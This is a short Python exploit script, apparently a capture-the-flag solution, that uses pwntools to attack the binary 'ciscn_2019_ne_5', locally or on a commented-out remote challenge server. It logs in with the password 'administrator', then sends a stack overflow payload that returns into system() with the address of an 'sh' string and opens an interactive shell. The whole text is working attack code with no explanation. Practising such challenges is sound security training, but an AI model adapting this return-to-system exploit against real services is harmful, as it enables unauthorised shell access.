from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

p = process('./ciscn_2019_ne_5')
#p = remote('node3.buuoj.cn',25689)
elf = ELF('ciscn_2019_ne_5')

system_addr = elf.symbols['system']
main_addr = elf.symbols['main']
str_sh_addr = 0x080482ea

p.recvuntil('password:')
p.sendline('administrator')

p.recvuntil('0.Exit\n:')
p.sendline('1')

payload = b'a' * ( 0x48 + 4 ) + p32(system_addr) + p32(0x8048521) + p32(str_sh_addr)

p.recvuntil('info:')
p.sendline(payload)

p.recvuntil('0.Exit\n:')

p.sendline('4')
p.interactive()
